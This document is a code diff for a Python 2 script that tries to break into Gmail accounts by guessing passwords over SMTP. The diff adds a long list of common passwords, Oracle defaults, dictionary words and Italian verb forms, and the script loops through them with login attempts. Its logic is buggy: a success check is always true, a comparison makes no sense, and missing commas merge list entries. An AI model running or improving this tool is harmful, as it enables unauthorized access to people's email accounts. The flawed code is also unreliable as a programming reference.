@@ -65,14 +65,54 @@ passlist = ['12345','abc123','password','computer','123456','tigger','1234','a1b
 '00kin37ic','00m','00m37129','00m3712ic','00m37312','00m4n7i4','00m4nc9','00m9c370u5','00m9c373','00m9c3735','00n5','00n7','00p012ph912in',
 '00p0d','00p0d41','00p1457''00p145m','00p145mic','00p4k','00ph01201212h4ph9','00ph01203pi13p59','00ph0120541pin63c70m9','00ph0120570m9',
 '00ph012070m9','00ph0120m4','00ph0120m414ci4','00ph0120m4ni4','00ph0120n','00ph0120p3x9','00ph0123','00ph01230c313',
-'00ph0123c70m9','00ph012416i4','00ph0124ux3','00ph012h9573123c70m9','00ph012i7i5','00ph012ic','00ph012idium','00ph973',
-'00ph97ic','00z00id','00z3','00z9','00zi19','00zin355','01',
+'00ph0123c70m9','00ph012416i4','00ph0124ux3','00ph012h9573123c70m9','00ph012i7i5','00ph012ic','00ph012idium','00ph973','00ph97ic','00z00id','00z3','00z9','00zi19','00zin355','01',
 '01-matrices','01-matrix','01-sequences','01-valued','01-vector','01012','01012050','01069','0106i57','0106i57ic','0106ic41','010m40',
 '010n375','010n375i4n','010n375i5h','010n4','0110ck','0113ni73''0114','0114mh','0114p0d','011i3','012','01201069',
 '0120106i57','0120106ic41','01201in6u41','01204n41','01206124ph','01206124ph9','01206124phic','01206124phic41','01206124phic4119',
 '012063n','012063n359','012063n35i5','012063n37ic','012063n9','012063nic','01207h3124p9','01207in4n','01207und','01207undi79',
 '0120b470id34','0120b47h9m3712ic','0120b4nch3','0120b4nch30u5','0120b4nch4c30u5','0120b4nch4c343','0120c1247ic','0120ch0n',
-'0120di46n05i5','0120h31i06124ph','0120h9d1206124ph9','0120h9d1206124phic','0120h9d1206124phic41','0120hippu5','0120id3']
+'0120di46n05i5','0120h31i06124ph','0120h9d1206124ph9','0120h9d1206124phic','0120h9d1206124phic41','0120hippu5','0120id3' 
+'!@#$%','!@#$%^','!@#$%^&','!@#$%^&*','*','0','0racl3','0racl38','0racl38i','0racl39','0racl39i','0racle','0racle10','0racle10i','0racle8',
+'0racle8i','0racle9','0racle9i','1','!@#$%','!@#$%^','!@#$%^&','!@#$%^&*','*','0','0racl3','0racl38','0racl38i','0racl39','0racl39i','0racle',
+'0racle10','0racle10i','0racle8','0racle8i','0racle9','0racle9i','1','1022','10sne1','111111','121212','1225','123','123123','1234','12345','123456',
+'1234567','12345678','123456789','1234qwer','123abc','123go','1313','131313','13579','14430','1701d','1928','1951','199220706','1a2b3c','1p2o3i','1q2w3e','1qw23e',
+'1sanjose','2','20','2000','2001','2002','2003','2112','21122112','2222','246','249','2welcome','369','4444','4runner','5252','54321','5555','5683','6071992','654321','666666',
+'6969','696969','7','7007','777','7777','80486','8675309','888888','90210','911','92072','99999999','<invalid>','<unknown>','@#$%^&','a','a&m','a&p','a','s','a12345','a1b2c3','a1b2c3d4','aa',
+'aaa','aaaaaa','aaas','aal','aalii','aam','aani','aardvark','aardwolf','aaren','aarhus','aarika','aaron','aaronic','aaronical','aaronite','aaronitic','aaru','aau','ab','aba','ababa','ababdeh',
+'ababua','abac','abaca','abacate','abacay','abacinate','abacination','abaciscus','abacist','aback','abactinal','abactinally','abaction','abactor','abaculus','abacus','abadite','abaff','abaft',
+'abagael','abagail','abaisance','abaiser','abaissed','29161015','abalienate','abalienation','abalone','abama','abampere','abandon','abandonable','abandoned','abandonedly','abandonee','abandoner','abandonment','abanic',
+'abantes','abaptiston','abarambo','abaris','abarthrosis','abarticular','abarticulation','abas','abase','abased','abasedly','abasedness','abasement','abaser','abasgi',
+'abash','abashed','abashedly','abashedness','abashless','abashlessly','abashment','abasia','abasic'
+,'abask','abassin','abastardize','abatable','abate','abatement','abater','abati','abatis','abatised','abaton','abator','abattoir','abatua','abature','abave','abaxial','abaxile','abaze','abb','abba','abbacomes','abbacy',
+'abbadide','abbagli','abbaglia','abbagliai','abbagliamo','abbagliano',
+'abbagliare','abbagliata','abbagliate','abbagliati','abbagliato','abbagliava','abbagliavi',
+'abbagliavo','abbagliera','abbagliero','abbaglino','abbaglio','abbai','abbaia','abbaiai','abbaiammo','abbaiamo','abbaiando','abbaiano','abbaiare','abbaiarono','abbaiasse','abbaiassi',
+'abbaiaste','abbaiasti','abbaiata','abbaiate','abbaiati','abbaiato','abbaiava','abbaiavamo','abbaiavano','abbaiavate','abbaiavi','abbaiavo','abbaiera','abbaierai','abbaierei','abbaieremo','abbaierete','abbaiero','abbaini','abbaino','abbaio','abbandona','abbandonai','abbandoni','abbandono','abbas',
+'abbasi','abbassa','abbassai','abbassammo','abbassando','abbassano','abbassare',
+'abbassasse','abbassassi','abbassaste','abbassasti','abbassata','abbassate','abbassati','abbassato','abbassava','abbassavi','abbassavo','abbassera','abbasserai',
+'abbasserei','abbassero','abbassi','abbassiamo','abbassiate','abbasside','abbassino','abbasso','abbastanza','abbatial','abbatical','abbatta','abbattano','abbatte','abbattei','abbattemmo','abbattendo','abbattera',
+'abbatterai','abbattere','abbatterei','abbattero','abbattesse','abbattessi','abbatteste','abbattesti','abbattete','abbattette','abbattetti','abbatteva','abbattevi','abbattevo','abbatti','abbattiamo','abbattiate','abbatto','abbattono','abbattuta','abbattute','abbattuti','abbattuto','abbazia','abbazie','abbe','abbellano','abbellendo',
+'abbelli','abbelliamo','abbelliate','abbellii','abbellimmo','abbellira','abbellirai','abbellire','abbellirei','abbelliro','abbellisca','abbellisce','abbellisci','abbellisco','abbellisse','abbellissi','abbelliste',
+'abbellisti','abbellita','abbellite','abbelliti','abbellito','abbelliva','abbellivi','abbellivo','abbess','abbevera','abbeverai','abbeverano','abbeverare','abbeverata','abbeverate','abbeverati','abbeverato','abbeverava','abbeveravi','abbeveravo','abbeverera','abbeverero','abbeveri','abbeverino','abbevero','abbey',
+'abbeystede','abbi','abbia','abbiamo','abbiano','abbiate','abbie','abbiente','abbienti','abbietta','abbiette','abbietti','abbietto','abbigli','abbiglia','abbigliai','abbigliamo','abbigliano','abbigliare','abbigliata','abbigliate','abbigliati','abbigliato','abbigliava','abbigliavi','abbigliavo','abbigliera','abbigliero','abbiglino','abbiglio','abbina','abbinai','abbinammo',
+'abbinando','abbinano','abbinare','abbinarono','abbinasse','abbinassi','abbinaste','abbinasti',
+'abbinata','abbinate','abbinati','abbinato','abbinava','abbinavamo','abbinavano','abbinavate','abbinavi','abbinavo','abbinera','abbinerai','abbinerei','abbineremo','abbinerete','abbinero','abbini','abbiniamo','abbiniate','abbinino','abbino','abbocca','abboccai','abboccammo','abboccando',
+'abboccano','abboccare','abboccasse','abboccassi','abboccaste','abboccasti','abboccata','abboccate','abboccati','abboccato','abboccava','abboccavi','abboccavo','abbocchera','abbocchero','abbocchi','abbocchino','abbocco','abbona','abbonai',
+'abbonammo','abbonando','abbonano','abbonare','abbonarono',
+'abbonasse','abbonassi','abbonaste','abbonasti','abbonata','abbonate','abbonati','abbonato','abbonava','abbonavamo','abbonavano','abbonavate','abbonavi','abbonavo','abbonda','abbondai','abbondammo','abbondando','abbondano','abbondante','abbondanti','abbondare',
+'abbondasse','abbondassi','abbondaste','abbondasti','abbondata','abbondate','abbondati','abbondato','abbondava','abbondavi','abbondavo','abbondera','abbonderai','abbonderei',
+'abbondero','abbondi','abbondiamo','abbondiate','abbondino','abbondo','abbonera','abbonerai','abbonerei','abboneremo','abbonerete','abbonero','abboni','abboniamo','abboniate','abbonino','abbono','abbot','abbotcy','abbotnullius','abbotship','abbott','abbozza','abbozzai','abbozzammo',
+'abbozzando','abbozzano','abbozzare','abbozzasse','abbozzassi','abbozzaste','abbozzasti','abbozzata','abbozzate','abbozzati','abbozzato','abbozzava','abbozzavi','abbozzavo','abbozzera','abbozzerai','abbozzerei','abbozzero','abbozzi','abbozziamo','abbozziate','abbozzino','abbozzo','abbracci','abbraccia','abbracciai','abbraccino','abbraccio','abbrevi','abbrevia','abbreviai','abbreviamo','abbreviano','abbreviare','abbreviata','abbreviate','abbreviately','abbreviati','abbreviation','abbreviato','abbreviator','abbreviatory','abbreviature','abbreviava','abbreviavi',
+'abbreviavo','abbreviera','abbreviero','abbrevino','abbrevio','abbronza','abbronzai','abbronzano','abbronzare','abbronzata',
+'abbronzate','abbronzati','abbronzato','abbronzava','abbronzavi','abbronzavo','abbronzera','abbronzero','abbronzi','abbronzino','abbronzo','abbruna','abbrunai','abbrunammo',
+'abbrunando','abbrunano','abbrunare','abbrunasse','abbrunassi','abbrunaste','abbrunasti','abbrunata','abbrunate','abbrunati','abbrunato','abbrunava','abbrunavi','abbrunavo','abbrunera','abbrunerai','abbrunerei','abbrunero',
+'abbruni','abbruniamo','abbruniate','abbrunino','abbruno','abbrustoli','abbuoni','abbuono','abby',
+'abbye','abc','abc123','abcd','abcd1234','abcde','abcdef','abcdefg','abcoulomb','abdal','abdat','abdel','abderian','abderite','abdest','abdica','abdicable',
+'abdicai','abdicammo','abdicando','abdicano','abdicant','abdicare','abdicarono','abdicasse','abdicassi','abdicaste','abdicasti','abdicata','abdicate','abdicati','abdication','abdicative','abdicato','abdicator','abdicava','abdicavamo','abdicavano','abdicavate','abdicavi','abdicavo','abdichera','abdicherai','abdicherei',
+'abdichero','abdichi','abdichiamo','abdichiate','abdichino','abdico','abdiel','abditive','abditory','abdomen','abdominal','abdominales','abdominalian','abdominally','abdominoanterior','abdominocardiac','abdominocentesis','abdominocystic','abdominogenital','abdominohysterectomy','abdominohysterotomy','abdominoposterior','abdominoscope','abdominoscopy','abdominothoracic','abdominous','abdominovaginal','abdominovesical',
+'abduce','abducens','abducent','abduct','abduction','abductor','abdul','abe','abeam','abear','abearance','abecedarian','abecedarium','abecedary','abed','abeigh','abel','abelard','abele','abelia','abelian','abelicea','abelite','abelmoschus','abelmosk',
+'abelonian','abelson','abeltree','abencerrages','abenteric','abepithymia','aberdeen','aberdevine','aberdonian','aberia','abernathy','aberrance','aberrancy','aberrant','aberrate','aberration','aberrational',
+'aberrator','aberrometer','aberroscope','aberuncator']
 
 
 def begin_brute_force():
@@ -90,13 +130,20 @@ def begin_brute_force():
 	print'           \______/ 											'
 	print'\t\t\t\t\tVersion [%s]' % __version__
 
+	start_time = time.time()
+
 	user = raw_input(Fore.RESET + '\n\n\n\nGmail Account: ')
+	print Fore.CYAN + '\n[*] Scanning: %s Passwords' % len(passlist)
+	time.sleep(3)
 	for password in passlist:
 	    try:
 	        smtpserver.login(user, password)
 	        if password == password:
 	        	print '\n\t[!] Password Found: %s' % password
 	        	break;
+	        	sys.exit()
+	        elif password in passlist == None:
+	        	print '\n\t[!] No Passwords Found.'
 	        	sys.exit()
 	        else:
 	        	print '\n\t[?] Error. Something went wrong?'
@@ -108,7 +155,7 @@ def begin_brute_force():
 	    except smtplib.SMTPServerDisconnected:
 	    	print '\n\t[?] Connection unexpectedly closed.'
 	    	sys.exit()
-	    	
+
 	    except KeyboardInterrupt:
 	    	raw_input("\n\t[!] Quiting Session...")
 	    	print '\n[!] Session Closed.'
@@ -116,6 +163,3 @@ def begin_brute_force():
 
 begin_brute_force()
 
-
-
-        
